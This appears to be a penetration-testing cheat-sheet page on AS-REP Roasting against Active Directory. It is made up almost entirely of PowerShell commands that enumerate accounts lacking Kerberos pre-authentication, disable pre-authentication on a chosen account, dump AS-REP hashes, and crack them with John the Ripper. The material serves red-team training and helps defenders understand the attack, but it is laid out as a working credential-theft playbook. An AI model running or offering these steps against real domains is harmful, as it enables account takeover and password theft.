# AS-REP Roasting

## Enumerate

Enumerating accounts with Kerberos pre-authentication disabled

{% tabs %}
{% tab title="PowerView" %}
```powershell
Get-DomainUser -PreauthNotRequired -Verbose
```
{% endtab %}

{% tab title="AD Module" %}
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```
{% endtab %}
{% endtabs %}

## Disable pre-authentication

{% tabs %}
{% tab title="PowerView" %}
```powershell
Set-DomainObject -Identity <User> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endtab %}
{% endtabs %}

## Retrieve the hash



{% tabs %}
{% tab title="PowerView" %}
```powershell
Get-ASREPHash -UserName VPN1user -Verbose
Invoke-ASREPRoast -Verbose
```
{% endtab %}
{% endtabs %}

## Crack

```powershell
john.exe --wordlist=passwords.txt asrephashes.txt
```

